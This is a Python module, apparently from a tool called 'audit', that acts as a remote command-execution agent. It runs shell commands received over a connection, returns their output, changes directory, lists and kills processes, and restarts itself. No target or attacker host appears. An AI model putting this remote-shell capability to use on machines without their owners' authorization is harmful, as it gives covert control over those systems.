import codecs
import os
import subprocess
import sys
import warnings
import psutil
from audit.core.connection import Connection
from audit.core.environment import Environment


# shell_command execute on client side command and send response to client
def shell_command(command):
    with open(Environment().path_streams + "/stdout.txt", "wb") as stdout_file, \
            open(Environment().path_streams + "/stderr.txt", "wb") as stderr_file, \
            open(Environment().path_streams + "/stdin.txt", "wb") as stdin_file:
        handle = subprocess.Popen(command, shell=True,
                                  stdin=stdin_file,
                                  stdout=stdout_file,
                                  stderr=stderr_file)
        handle.wait()


# exec_command execute on client side command and send response to client
def exec_command(connection: Connection, command: str):
    shell_command(command)
    stdout, stderr = communicate()
    if stdout == '' and stderr == '':
        # send that's right if there's no output
        connection.send_msg("execution successfully")
    elif stdout != '':
        # send output
        connection.send_msg(stdout)
    else:
        # send error if something happen
        connection.send_msg(stderr)


# communicate get streams from subprocess which is executing shell command
def communicate():
    stdout_file = codecs.open(Environment().path_streams + "/stdout.txt",
                              mode="rb", encoding=Environment().codec_type,
                              errors="replace")
    stderr_file = codecs.open(Environment().path_streams + "/stderr.txt",
                              mode="rb", encoding=Environment().codec_type,
                              errors="replace")
    stdout = stdout_file.read()
    stderr = stderr_file.read()
    stdout_file.close()
    stderr_file.close()
    return stdout, stderr


# cd change current working directory
def cd(connection: Connection, command: str):
    splitted = command.split("$")
    if len(splitted) > 1:
        new_cwd = splitted[1]
        try:
            os.chdir(new_cwd)
            connection.send_msg("changing directory to: " + new_cwd)
        except:
            connection.send_msg("the directory: " + new_cwd + " doesn't exists")
    else:
        connection.send_msg("no arguments specified for cd")


# get_processes retrieve information about system processes
def get_processes(connection: Connection):
    res = ""
    for process in psutil.process_iter():
        res += "PID: " + str(process.pid) + " NAME: " + process.name() + "\n"
    connection.send_msg(res)


# kill_process kill process by pid
def kill_process(connection: Connection, command: str):
    splitted = command.split("$")
    if len(splitted) > 1:
        try:
            pid = int(splitted[1])
            process = psutil.Process(pid)
            process.kill()
            connection.send_msg("Killed successfully")
        except Exception as e:
            warnings.warn(str(e))
            connection.send_msg("Invalid arguments")
    else:
        connection.send_msg("Invalid arguments")


# restart restart the system
def restart():
    os.execl(sys.executable, sys.executable, *sys.argv)


# check_active_processes() delete from de dict processes which have finished
def check_active_processes(process_active):
    revocation_list = []
    for process in process_active.keys():
        if not process_active[process][0].is_alive():
            revocation_list.append(process)
    for name in revocation_list:
        process_active.pop(name, None)  # Process is finish
